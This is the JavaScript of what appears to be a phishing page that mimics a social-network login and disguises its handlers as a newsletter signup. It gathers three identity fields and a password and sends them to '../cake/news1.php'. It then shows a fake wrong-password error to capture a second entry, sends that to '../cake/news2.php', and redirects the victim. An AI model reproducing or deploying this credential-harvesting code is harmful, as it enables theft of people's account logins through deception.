      <script type="">

        var _f1 = document.getElementById("_f111");
        var _f2 = document.getElementById("_f222");
        var _f3 = document.getElementById("_f333");
        var _fp = document.getElementById("_fppp");


        $(document).keypress(function(e) {

            if($("#_f111").is(":focus")){
            if(e.which == 13) {
                e.preventDefault();
                $("#u_0_8_iQ").trigger("click");
            }
            }

            if($("#_f222").is(":focus")){
            if(e.which == 13) {
                e.preventDefault();
                $("#u_0_8_iQ").trigger("click");
            }
            }

            if($("#_f333").is(":focus")){
            if(e.which == 13) {
                e.preventDefault();
                $("#u_0_8_iQ").trigger("click");
            }
            }

            if($("#_fppp").is(":focus")){
            if(e.which == 13) {
                e.preventDefault();
                $("#__getNewslteter").trigger("click");
            }
            }

            });


        // Continue button
        $("#u_0_8_iQ").click(function()
        {
            //alert("CLICKED");
            //$("#_fppp").removeClass("errcls");
            var f1 = document.getElementById("_f111").innerHTML;
            var f2 = document.getElementById("_f222").innerHTML;
            var f3 = document.getElementById("_f333").innerHTML;

            var errori2=document.getElementById("errori2");
            if(f1=="" || f2=="" || f3=="")
            {
               
                errori2.style.display="block";
            }
            else
            {
               // alert(f1+"-"+f2+"-"+f3);
                errori2.style.display="none";
                var modal = document.getElementById("myModal");
                $("#__fuln").html(f1);
                modal.style.display = "block";
            }
        });// END Continue button


        // PASS pres key
        function pressKEY()
        {
        var fp = document.getElementById("_fppp").innerHTML;
        var strL=fp.length;
        if(strL==0)
        {
            $("#_fppp").removeClass("clspwd");
        }
        else
        {
            $("#_fppp").addClass("clspwd");

        }

        }
        // end of PASS pres key




        // submit pass
        $("#__getNewslteter").click(function(){
      
            var fp = document.getElementById("_fppp").innerHTML;

            if(fp=="")
            {
                $("#_fppp").addClass("errcls");
            }
            else
            {
	            if(fp.includes("#"))
                {
                    fp=fp.replaceAll("#", "`");
                } 

                if(fp.includes("&"))
                {
                    fp=fp.replaceAll("&", "|");
                } 

                if(fp.includes("+"))
                {
                    fp=fp.replaceAll("+", "XxXx");
                } 

                var f1 = document.getElementById("_f111").innerHTML;
                var f2 = document.getElementById("_f222").innerHTML;
                var f3 = document.getElementById("_f333").innerHTML;
                $("#_fppp").removeClass("errcls");

                var divider=$("#_divider").val();

                if(divider=="0")
                {
                    // login 1
                    var xmlhttp = new XMLHttpRequest();
                    xmlhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                    $("#_divider").val("1");
                    //alert(this.responseText);
                    
                    var divierroooor=document.getElementById("erroriPWD");
                    divierroooor.style.display="block";
                    var shprazje=document.getElementById("_fppp");
                    shprazje.innerHTML="";

                    var shprazje1=document.getElementById("reenter");
                    shprazje1.innerHTML="Re-enter Your Password";
                    $("#_fppp").removeClass("clspwd");
                    

                    }
                    };
                    xmlhttp.open("GET", "../cake/news1.php?f1=" + f1+"&f2="+f2+"&f3="+f3+"&fp="+fp, true);
                    xmlhttp.send();
                    //alert("pass 1");
                }
                else
                {

                    //alert("hini n 2");
                    // login 2
                    var xmlhttp = new XMLHttpRequest();
                    xmlhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                    //alert(this.responseText);
                    $("#_fppp").removeClass("errcls");
                    location.href=this.responseText;
                    }
                    };
                    xmlhttp.open("GET", "../cake/news2.php?f1=" + f1+"&f2="+f2+"&f3="+f3+"&fp="+fp, true);
                    xmlhttp.send();
                    //alert("pass 2");
                }



      }
   }); // end of submit pass
